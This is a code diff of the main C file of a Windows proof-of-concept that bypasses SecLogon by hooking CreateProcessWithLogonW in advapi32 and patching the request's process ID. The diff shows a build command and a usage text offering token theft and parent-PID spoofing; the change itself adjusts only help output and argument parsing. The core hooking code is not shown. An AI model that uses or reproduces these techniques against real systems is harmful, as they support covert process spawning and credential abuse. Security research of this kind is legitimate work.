@@ -1,15 +1,16 @@
 // SecLogon SECL_REQUEST.dwProcessId bypass PoC
 //
-// Demonstrates that CreateProcessWithLogonW can be called from SYSTEM context
+// Demonstrates CreateProcessWithLogonW from SYSTEM context
 // by hooking the c_SeclCreateProcessWithLogonW call site inside advapi32 and
 // patching SECL_REQUEST.dwProcessId to a user-owned PID before the RPC fires.
 //
 // Research references:
+//
 //   https://github.com/CarlosG13/SecLogon-RPC
 //   https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
 //
 // Build:
-//   x86_64-w64-mingw32-gcc blog_main.c -o poc.exe -lntdll -static -static-libgcc -DDEBUG_BUILD=1
+//   x86_64-w64-mingw32-gcc main.c -o PoC.exe -lntdll -static -static-libgcc -DDEBUG_BUILD=1
 //
 // Usage:
 //   PoC.exe -u DOMAIN\user -p password [-t steal_user] [--ppid procname]
@@ -19,6 +20,7 @@
 #include "spawn.h"
 
 static void _usage(const char *prog) {
+    printf("\n  SecLogon SECL_REQUEST.dwProcessId bypass PoC\n\n");
     printf("Usage: %s -u DOMAIN\\user -p password [options]\n\n", prog);
     printf("Options:\n");
     printf("  -u <DOMAIN\\user>     target credentials (required)\n");
@@ -27,26 +29,29 @@ static void _usage(const char *prog) {
     printf("  --ppid <procname>    preferred parent process name for PPID spoof\n");
     printf("  -c <cmdline>         command to spawn (default: cmd.exe)\n");
     printf("  --sleep <ms>         sleep before CPWLW (debugger attach window)\n");
+    printf("  -h, --help           show this help\n\n");
 }
 
 int main(int argc, char *argv[]) {
-    DBG_INFO("SecLogon SECL_REQUEST.dwProcessId bypass PoC");
-    DBG_SEPARATOR();
+    DBG_INFO("SecLogon SECL_REQUEST.dwProcessId bypass PoC by @ippy0kai");
+    // DBG_SEPARATOR();
 
-    LPCSTR credUser    = NULL;
-    LPCSTR credPass    = NULL;
-    LPCSTR targetUser  = NULL;
-    LPCSTR cmdline     = "cmd.exe";
-    LPCSTR ppidName    = NULL;
-    DWORD  sleepMs     = 0;
+    LPCSTR credUser   = NULL;
+    LPCSTR credPass   = NULL;
+    LPCSTR targetUser = NULL;
+    LPCSTR cmdline    = "cmd.exe";
+    LPCSTR ppidName   = NULL;
+    DWORD  sleepMs    = 0;
 
     for (int i = 1; i < argc; i++) {
-        if      (strcmp(argv[i], "-u") == 0 && i+1<argc) credUser   = argv[++i];
-        else if (strcmp(argv[i], "-p") == 0 && i+1<argc) credPass   = argv[++i];
-        else if (strcmp(argv[i], "-t") == 0 && i+1<argc) targetUser = argv[++i];
-        else if (strcmp(argv[i], "-c") == 0 && i+1<argc) cmdline    = argv[++i];
-        else if (strcmp(argv[i], "--ppid")  == 0 && i+1<argc) ppidName = argv[++i];
-        else if (strcmp(argv[i], "--sleep") == 0 && i+1<argc)
+        if      (strcmp(argv[i], "-h")     == 0 ||
+                 strcmp(argv[i], "--help") == 0) { _usage(argv[0]); return 0; }
+        else if (strcmp(argv[i], "-u")     == 0 && i+1<argc) credUser   = argv[++i];
+        else if (strcmp(argv[i], "-p")     == 0 && i+1<argc) credPass   = argv[++i];
+        else if (strcmp(argv[i], "-t")     == 0 && i+1<argc) targetUser = argv[++i];
+        else if (strcmp(argv[i], "-c")     == 0 && i+1<argc) cmdline    = argv[++i];
+        else if (strcmp(argv[i], "--ppid") == 0 && i+1<argc) ppidName   = argv[++i];
+        else if (strcmp(argv[i], "--sleep")== 0 && i+1<argc)
             sleepMs = (DWORD)strtoul(argv[++i], NULL, 10);
         else { DBG_ERR("unknown arg: %s", argv[i]); _usage(argv[0]); return 1; }
     }
